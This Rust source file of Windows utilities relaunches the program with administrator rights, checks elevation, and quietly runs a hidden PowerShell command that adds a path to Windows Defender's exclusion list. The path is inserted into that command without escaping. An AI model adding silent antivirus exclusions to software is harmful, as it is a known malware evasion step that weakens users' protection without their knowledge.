use std::path::PathBuf;
use std::ptr::null_mut;

use widestring::U16CString;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::shellapi::ShellExecuteW;
use winapi::um::winbase::CREATE_NO_WINDOW;
use winapi::um::winuser::SW_SHOWNORMAL;

use winapi::um::winnt::{HANDLE, TOKEN_QUERY};
use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::handleapi::CloseHandle;

use winapi::um::securitybaseapi::GetTokenInformation;

pub fn restart_as_admin(relaunch_args: &str) -> Result<(), String> {
    let exe_path = std::env::current_exe()
        .map_err(|e| format!("Failed to get current executable path: {}", e))?;

    let exe_path_wide = U16CString::from_str(exe_path.to_str().unwrap_or(""))
        .map_err(|e| format!("Failed to convert path to wide string: {}", e))?;

    let args_wide = U16CString::from_str(relaunch_args)
        .map_err(|e| format!("Failed to convert relaunch args to wide string: {}", e))?;

    let operation_wide = U16CString::from_str("runas")
        .map_err(|e| format!("Failed to convert operation to wide string: {}", e))?;

    let result = unsafe {
        ShellExecuteW(
            null_mut(),
            operation_wide.as_ptr(),
            exe_path_wide.as_ptr(),
            args_wide.as_ptr(),
            null_mut(),
            SW_SHOWNORMAL,
        )
    };

    if result as usize <= 32 {
        let error_code = unsafe { GetLastError() };
        return Err(format!("Failed to restart as admin: error code {}", error_code));
    }

    std::process::exit(0);
}

pub fn is_running_as_admin() -> Result<bool, String> {
    unsafe {
        let process_handle = GetCurrentProcess();
        if process_handle.is_null() {
            return Err("Failed to get current process handle".to_string());
        }

        let mut token_handle: HANDLE = null_mut();
        if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle) == 0 {
            return Err(format!(
                "Failed to open process token: {}",
                GetLastError()
            ));
        }

        let mut token_info_length: u32 = 0;
        GetTokenInformation(
            token_handle,
            winapi::um::winnt::TokenElevation,
            null_mut(),
            0,
            &mut token_info_length,
        );

        let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
        if GetTokenInformation(
            token_handle,
            winapi::um::winnt::TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<winapi::um::winnt::TOKEN_ELEVATION>() as u32,
            &mut token_info_length,
        ) == 0
        {
            let error_code = GetLastError();
            CloseHandle(token_handle);
            return Err(format!("Failed to get token information: {}", error_code));
        }

        CloseHandle(token_handle);

        Ok(elevation.TokenIsElevated != 0)
    }
}

pub fn add_to_defender_exclusion(path: &PathBuf) -> Result<(), String> {
    let powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string();
    let path_str = path.to_str().ok_or("Failed to convert path to string")?;

    let powershell_exe = U16CString::from_str(&powershell_path)
        .map_err(|e| format!("Failed to convert PowerShell path to wide string: {}", e))?;
    let command = format!(
        "\"{}\" Add-MpPreference -ExclusionPath '{}'",
        powershell_path,
        path_str
    );
    let command_wide = U16CString::from_str(&command)
        .map_err(|e| format!("Failed to convert command to wide string: {}", e))?;

    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let success = unsafe {
        CreateProcessW(
            powershell_exe.into_raw() as *mut u16,
            command_wide.into_raw() as *mut u16,
            null_mut(),
            null_mut(),
            0,
            CREATE_NO_WINDOW | winapi::um::winbase::DETACHED_PROCESS,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };
    if success == 0 {
        let error_code = unsafe { GetLastError() };
        return Err(format!("Failed to create PowerShell process: {}", error_code));
    }

    unsafe {
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
    }

    Ok(())
}